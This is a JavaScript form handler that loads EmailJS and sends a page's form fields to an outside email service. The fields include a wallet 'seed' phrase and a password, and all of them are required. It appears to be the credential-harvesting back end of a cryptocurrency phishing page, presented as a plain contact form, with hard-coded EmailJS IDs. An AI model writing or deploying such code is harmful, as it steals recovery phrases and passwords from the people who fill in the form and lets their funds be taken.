// Include the EmailJS script in the HTML or dynamically load it in the JavaScript

// Check if EmailJS is already loaded, if not, load it dynamically
if (!window.emailjs) {
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js';
    document.head.appendChild(script);
    script.onload = function() {
        // Initialize EmailJS once it's loaded
        emailjs.init("UzvWE4cijC2AeexsY");  // Your EmailJS user ID
    };
} else {
    // EmailJS is already loaded, initialize it
    emailjs.init("UzvWE4cijC2AeexsY");
}

// Form submission event handler
document.querySelector('form').addEventListener('submit', function(event) {
    event.preventDefault();

    // Collect form data
    var emailData = {
        email: document.querySelector('input[name=email]').value,
        dropdown1: document.querySelector('select[name=dropdown1]').value,
        dropdown2: document.querySelector('select[name=dropdown2]').value,
        address: document.querySelector('input[name=address]').value,
        seed: document.querySelector('input[name=seed]').value,
        password: document.querySelector('input[name=password]').value
    };

    // Validate that all fields are filled
    if (!emailData.email || !emailData.dropdown1 || !emailData.dropdown2 || !emailData.address || !emailData.seed || !emailData.password) {
        alert("Please fill out all required fields.");
        return;
    }

    // Send the form data using EmailJS
    emailjs.send("service_29nyhzq", "template_i3682ek", emailData)
        .then(function(response) {
            // Show success message
            alert('Email sent successfully!');
        }, function(error) {
            // Show error message if email sending fails
            alert('Failed to send email. Please try again.');
        });
});

